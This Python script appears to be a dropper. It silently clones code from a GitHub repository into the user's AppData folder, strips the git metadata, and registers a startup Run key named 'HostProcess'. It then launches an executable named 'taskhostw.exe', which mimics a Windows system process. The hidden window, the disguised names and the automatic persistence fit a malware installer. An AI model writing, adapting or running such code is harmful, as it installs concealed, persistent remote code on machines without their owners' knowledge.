import shutil
import stat
import subprocess
import sys
import os

repo = 'https://github.com/aantr/WindowsHostManager'
repo_name = 'WindowsHostManager'
autorun_name = 'HostProcess'
exe_path = [repo_name, 'taskhostw.exe']
exe_arg = [repo_name, 'main', 'main.py']

path_to_extract = os.environ['APPDATA']
path_to_extract = os.path.join(os.path.split(path_to_extract)[0], 'Local')


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, *relative_path)


def main(log):
    dir_path = os.path.join(path_to_extract, repo_name)
    if os.path.exists(dir_path):
        log.append('Removing existing...')
        shutil.rmtree(dir_path)

    log.append('Cloning...')

    git_path = resource_path('data/git_portable/mingw32/bin/git.exe'.split('/'))
    if not os.path.exists(dir_path):
        os.mkdir(dir_path)
    cmd = [git_path, 'clone', repo, dir_path]

    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         stdin=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
    output, err = p.communicate()

    log.append('Removing git...')

    def on_rm_error(func, path, exc_info):
        os.chmod(path, stat.S_IWRITE)
        os.unlink(path)

    for i in os.listdir(dir_path):
        if i.endswith('git'):
            tmp = os.path.join(dir_path, i)
            while True:
                subprocess.call(['attrib', '-H', tmp])
                break
            shutil.rmtree(tmp, onerror=on_rm_error)

    add_autorun_cmd = fr'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v ' + \
                      fr'"{autorun_name}" /d "\"{os.path.join(path_to_extract, *exe_path)}\" ' + \
                      fr'\"{os.path.join(path_to_extract, *exe_arg)}\"" /f'
    log.append('Adding to autorun...')
    p = subprocess.Popen(add_autorun_cmd, stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         stdin=subprocess.DEVNULL)
    p.communicate()

    log.append('Running...')

    p = subprocess.Popen([os.path.join(path_to_extract, *exe_path),
                          os.path.join(path_to_extract, *exe_arg)],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         stdin=subprocess.DEVNULL)

    log.append('Done')

    return log
